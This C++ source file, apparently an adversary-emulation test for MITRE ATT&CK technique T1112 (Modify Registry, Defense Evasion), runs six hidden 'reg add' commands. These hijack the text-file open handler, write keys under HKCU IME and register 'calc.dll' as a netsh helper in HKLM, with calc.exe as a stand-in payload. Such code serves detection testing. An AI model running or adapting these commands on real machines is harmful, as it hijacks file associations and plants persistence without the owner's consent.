---
title: "T1112.Modify Registry"
folder: "07. Defense Evasion"
---



#include <windows.h>
#include <fstream>
#include <iostream>


void ROOT() {

    const char* command = "reg add \"HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command\"  /t REG_EXPAND_SZ /d \"C:\\Windows\\System32\\calc.exe\" /f";
    STARTUPINFOA si = {};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;


    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}
void USER() {

    const char* command = "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\IME\" /t REG_SZ /d \"C:\\Windows\\System32\\calc.exe\" /f";
    STARTUPINFOA si = {};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;


    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}
void Local() {

    const char* command = "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\NetSh\" /v \"WcnNetsh\" /t REG_SZ /d \"calc.dll\" /f";
    STARTUPINFOA si = {};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;


    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}
void ROOT1() {

    const char* command = "reg add \"HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\comtest\"  /t REG_EXPAND_SZ /d \"C:\\Windows\\System32\\calc.exe\" /f";
    STARTUPINFOA si = {};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;


    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}
void USER1() {

    const char* command = "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\IMEtest\" /t REG_SZ /d \"C:\\Windows\\System32\\calc.exe\" /f";
    STARTUPINFOA si = {};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;


    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
} 
void Local1() {

    const char* command = "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Nettest\" /v \"WcnNetsh\" /t REG_SZ /d \"calc.dll\" /f";
    STARTUPINFOA si = {};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;


    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {


    ROOT();
    USER();
    Local();
    ROOT1();
    USER1();
    Local1();
    return 0;
}